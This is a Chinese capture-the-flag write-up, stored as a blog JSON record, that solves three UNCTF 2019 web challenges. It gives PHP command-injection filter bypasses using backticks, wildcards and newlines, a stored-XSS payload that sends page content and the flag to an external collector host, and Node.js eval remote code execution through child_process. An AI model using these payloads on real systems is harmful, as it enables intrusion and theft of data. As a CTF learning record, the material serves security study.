{"title":"UNctf 赛后回顾","slug":"unctf","date":"2019-11-20T01:26:49.000Z","updated":"2019-12-01T12:59:49.886Z","comments":true,"path":"api/articles/unctf.json","photos":[],"link":"","excerpt":null,"covers":null,"content":"<h1 id=\"UNctf-赛后回顾\"><a href=\"#UNctf-赛后回顾\" class=\"headerlink\" title=\"UNctf 赛后回顾\"></a>UNctf 赛后回顾</h1><h2 id=\"bypass\"><a href=\"#bypass\" class=\"headerlink\" title=\"bypass\"></a>bypass</h2><p>题目源码：</p>\n<pre><code>&lt;?php\n    highlight_file(__FILE__);\n    $a = $_GET[&apos;a&apos;];\n    $b = $_GET[&apos;b&apos;];\n // try bypass it\n    if (preg_match(&quot;/\\&apos;|\\&quot;|,|;|\\\\|\\`|\\*|\\n|\\t|\\xA0|\\r|\\{|\\}|\\(|\\)|&lt;|\\&amp;[^\\d]|@|\\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;, $a))\n        $a = &quot;&quot;;\n        $a =&apos;&quot;&apos; . $a . &apos;&quot;&apos;;\n    if (preg_match(&quot;/\\&apos;|\\&quot;|;|,|\\`|\\*|\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|&lt;|\\&amp;[^\\d]|@|\\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;, $b))\n        $b = &quot;&quot;;\n        $b = &apos;&quot;&apos; . $b . &apos;&quot;&apos;;\n     $cmd = &quot;file $a $b&quot;;\n      str_replace(&quot; &quot;,&quot;&quot;,&quot;$cmd&quot;); \n     system($cmd);\n?&gt;</code></pre><h3 id=\"one-way\"><a href=\"#one-way\" class=\"headerlink\" title=\"one way\"></a>one way</h3><p>正则黑名单匹配，对输入的参数强制加上双引号，即使我们绕过检测也会被加上双引号无法执行命令。这里用到了反引号 ```</p>\n<p>观察第一个正则 `\\|`` 三个反斜杠才能转义反斜杠，这里对 | 进行了转义从而造成反引号逃逸。</p>\n<pre><code>&lt;?php\n$a = &quot;`dir`&quot;;\nif (preg_match(&quot;/\\&apos;|\\&quot;|,|;|\\\\|\\`/is&quot;,$a))\n    $a = &quot;&quot;;\n    $a =&apos;&quot;&apos; . $a . &apos;&quot;&apos;;\n    var_dump($a);\n\nstring(7) &quot;&quot;`dir`&quot;&quot;</code></pre><p>可以看到反引号成功逃逸。</p>\n<p>我们到题目中尝试列目录，没有 <code>ls</code> 可以用 <code>dir</code></p>\n<pre><code>?a=`dir%20/`\n\n响应：\n\nbin dev home lib64 mnt proc run srv sys usr boot etc lib media opt root sbin start.sh tmp var: cannot open `bin dev home lib64\\011mnt proc run\\011 srv\\011 sys\\011usr\\012boot etc lib\\011 media\\011opt root sbin start.sh tmp\\011var&apos; (No such file or directory) : cannot open `&apos; (No such file or directory) </code></pre><p>查找flag </p>\n<pre><code>?a=`/b??/gr??%20-R%20unctf`\n\n响应：\n.F1jh_/h3R3_1S_your_F1A9.txt:unctf{86dfe85d7c5842c5c04adae104193ee1}: cannot open `.F1jh_/h3R3_1S_your_F1A9.txt:unctf{86dfe85d7c5842c5c04adae104193ee1}&apos; (No such file or directory) : cannot open `&apos; (No such file or directory) </code></pre><h2 id=\"another-way\"><a href=\"#another-way\" class=\"headerlink\" title=\"another way\"></a>another way</h2><p>第二个正则 <code>\\\\|\\n</code> 会解释为竖线和换行，所以利用 <code>%0a</code> 进行换行绕过，同时末尾使用 <code>%20#</code> 来终止命令处理双引号</p>\n<pre><code>?a=\\&amp;b=%0a/???/gr?p%20-R%20ctf%20%23\n效果是\nfile&quot;\\&quot;&quot;\n/???/gr?p -R ctf #&quot;</code></pre><h2 id=\"easy-xss\"><a href=\"#easy-xss\" class=\"headerlink\" title=\"easy xss\"></a>easy xss</h2><p>在留言板处提交 xss 发现能够触发，访问储存的路径发现一个接口</p>\n<pre><code>http://112.74.37.15:8010/index.php/treehole/view?id=5dcd1d7bd11a4</code></pre><p>此时的请求头里带上了 <code>XMLHttpRequest</code> ，同时不带参数访问时得到 debug 页面，可以看到 XHR请求带上了 cookie ，于是我们构造 XHR 请求</p>\n<pre><code>&lt;img src=&apos;/efefefe&apos; onerror=&quot;xmlhttp=new\nXMLHttpRequest();xmlhttp.withCredentials=true;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){location.href=&apos;http://xssye.com/kOaI/?flag=&apos;\nxmlhttp.responseText.match(&apos;flag\\\\{(.\\*?)\\\\}&apos;)[1]}};xmlhttp.open(&apos;GET&apos;,&apos;/index.php/treehole/view?id=&apos;,true);xmlhttp.send(&apos;&apos;);&quot;/\\&gt;</code></pre><h2 id=\"checkin\"><a href=\"#checkin\" class=\"headerlink\" title=\"checkin\"></a>checkin</h2><p>查看源码发现各个接口</p>\n<pre><code>      switch (e.cmd) {\n        case &apos;name&apos;:\n          this.nickname = e.msg,\n          this.kesshoubanMsg(`Change nickname ${this.nickname\n        }\n         success!`);\n        break;\n      case &apos;error&apos;:\n        this.kesshoubanMsg(`🙁${e.msg\n    }\n    `);\n    break;\n  case &apos;calc&apos;:\n    this.kesshoubanMsg(`${e.msg\n  }\n  `);\n  break;\ncase &apos;flag&apos;:\n  this.kesshoubanMsg(`${e.msg\n}\n`);</code></pre><p>修改完名字后测试 <code>/calc 1+1</code> 发现成功执行，存在代码注入参考<a href=\"http://qnkcdz0.xyz/2019/06/24/Node-js%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Beval%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/\" target=\"_blank\" rel=\"noopener\">http://qnkcdz0.xyz/2019/06/24/Node-js%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Beval%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</a></p>\n<p>尝试 <code>/calc require(&#39;child_process&#39;).execSync(&#39;cat$IFS/flag&#39;).toString();</code> 其中空格过滤绕过 $IFS ，同时Sync采用非阻塞返回。</p>\n","categories":[{"name":"wp","slug":"wp","count":2,"path":"api/categories/wp.json"}],"tags":[{"name":"ctf","slug":"ctf","count":3,"path":"api/tags/ctf.json"},{"name":"wp","slug":"wp","count":3,"path":"api/tags/wp.json"}]}